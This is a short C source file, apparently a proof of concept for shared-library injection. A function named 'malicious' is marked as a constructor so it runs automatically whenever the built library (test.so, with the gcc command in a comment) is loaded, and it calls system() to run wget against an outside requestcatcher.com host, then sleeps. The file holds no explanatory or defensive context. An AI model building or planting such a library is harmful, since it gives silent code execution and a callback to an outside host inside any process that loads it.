#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("wget http://yyyyyyysh.requestcatcher.com/");
    system("sleep 10");
}


// gcc -shared -o test.so -fPIC test.c